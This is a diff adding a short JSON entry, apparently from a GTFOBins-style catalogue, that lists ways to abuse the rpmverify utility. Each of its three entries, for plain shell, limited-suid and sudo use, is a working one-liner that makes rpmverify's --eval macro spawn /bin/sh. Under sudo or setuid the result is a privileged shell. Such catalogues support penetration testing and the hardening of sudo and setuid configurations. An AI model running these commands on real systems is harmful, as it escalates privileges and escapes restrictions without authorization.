@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "rpmverify --eval '%(/bin/sh 1>&2)'\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        
+        "code": "./rpmverify --eval '%(/bin/sh 1>&2)'\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo rpmverify --eval '%(/bin/sh 1>&2)'\n"
+      }
+    ]
+  }
+}
